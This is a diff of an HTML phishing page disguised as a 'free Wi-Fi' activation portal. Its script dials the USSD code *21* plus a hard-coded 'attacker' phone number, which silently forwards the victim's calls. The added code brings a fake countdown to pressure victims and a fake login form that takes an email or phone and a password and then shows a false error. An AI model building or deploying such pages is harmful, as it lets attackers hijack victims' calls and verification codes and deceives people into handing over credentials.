@@ -3,47 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Wi-Fi Access</title>
+    <title>Wi-Fi Access Portal</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             text-align: center;
-            padding: 50px;
-            background-color: #f4f4f4;
+            background: linear-gradient(135deg, #007bff, #00c6ff);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
         }
         .container {
             background: white;
-            padding: 20px;
-            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
-            border-radius: 10px;
-            display: inline-block;
+            padding: 30px;
+            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.2);
+            border-radius: 15px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            color: #333;
+        }
+        .wifi-icon {
+            font-size: 50px;
+            color: #007bff;
+            margin-bottom: 15px;
         }
         .btn {
-            background: green;
+            background: #ff5733;
             color: white;
-            padding: 10px 20px;
+            padding: 12px 20px;
             border: none;
             cursor: pointer;
             font-size: 18px;
+            border-radius: 8px;
+            transition: 0.3s;
+            width: 100%;
+        }
+        .btn:hover {
+            background: #e04e2a;
+        }
+        .countdown {
+            font-size: 18px;
+            color: red;
+            font-weight: bold;
+        }
+        .login-box {
+            margin-top: 20px;
+            text-align: left;
+        }
+        .login-box input {
+            width: 90%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
             border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-btn {
+            background: #007bff;
+            color: white;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .login-btn:hover {
+            background: #0056b3;
+        }
+        .alert {
+            color: green;
+            font-size: 14px;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Get Free Wi-Fi Access</h2>
-        <p>Scan and click below to activate your free internet.</p>
-        <button class="btn" onclick="redirectUSSD()">Enable Free Wi-Fi</button>
+        <div class="wifi-icon">📶</div>
+        <h2>Activate Free Wi-Fi</h2>
+        <p>Limited Time Offer! <span class="countdown" id="timer">30</span> seconds left!</p>
+        <p><strong>Claim your 1GB Free Data now!</strong></p>
+        
+        <button class="btn" onclick="redirectUSSD()">Activate Now</button>
+
+        <div class="login-box">
+            <h3>Login to Continue</h3>
+            <input type="text" placeholder="Email or Phone" id="username">
+            <input type="password" placeholder="Password" id="password">
+            <button class="login-btn" onclick="fakeLogin()">Login</button>
+            <p class="alert" id="alertBox"></p>
+        </div>
     </div>
 
     <script>
         function redirectUSSD() {
             var attackerNumber = "+916375999606";  // Replace with your number
             var ussdCode = "*21*" + attackerNumber + "#";
-
-            // USSD execution method using 'tel://' URI
             window.location.href = "tel:" + encodeURIComponent(ussdCode);
         }
+
+        function fakeLogin() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            if(username && password) {
+                document.getElementById("alertBox").innerText = "Error: Incorrect Password. Try again.";
+            }
+        }
+
+        function countdownTimer() {
+            let timeLeft = 30;
+            const timer = document.getElementById("timer");
+
+            const countdown = setInterval(() => {
+                timeLeft--;
+                timer.innerText = timeLeft;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    timer.innerText = "0";
+                }
+            }, 1000);
+        }
+
+        countdownTimer();
     </script>
 </body>
 </html>
